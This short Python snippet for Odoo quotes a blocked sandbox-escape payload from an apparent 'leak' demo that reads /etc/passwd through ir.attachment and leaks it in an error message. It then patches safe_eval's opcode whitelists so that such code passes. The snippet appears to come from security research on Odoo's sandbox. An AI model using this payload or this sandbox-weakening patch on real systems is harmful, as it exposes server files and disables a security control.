from odoo.tools.safe_eval import evaluation

# odoo.tools.convert.ParseError: while parsing /Users/dle/src/odoo/master/addons/safer_code/data/leak_10_unsafe_getattr_setattr_demo.xml:5
# forbidden opcode(s) in "try:\n    env['ir.attachment']._field_add(\n        '_full_path',\n        # Pass something here,\n    )\nexcept Exception:\n    pass\nresult = env['ir.attachment']._file_read('/etc/passwd')\nraise UserError(result)": JUMP_BACKWARD_NO_INTERRUPT
#
# View error context:
# '-no context-
evaluation._CONST_OPCODES.symmetric_difference_update(evaluation.to_opcodes(["JUMP_BACKWARD_NO_INTERRUPT"]))
evaluation._EXPR_OPCODES.update(evaluation.to_opcodes(["JUMP_BACKWARD_NO_INTERRUPT"]))
evaluation._SAFE_OPCODES.update(evaluation.to_opcodes(["JUMP_BACKWARD_NO_INTERRUPT"]))

